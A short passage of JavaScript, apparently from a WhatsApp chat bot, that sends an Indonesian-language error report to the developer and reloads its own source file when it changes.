      text: "*Hallo developer, telah terjadi error pada command :* " + (isCmd ? prefix + command : _0x172af6.text) + "\n\n*Detail informasi error :*\n" + util.format(_0x14f5f9),
      contextInfo: {
        isForwarded: true
      }
    }, {
      quoted: _0x172af6
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});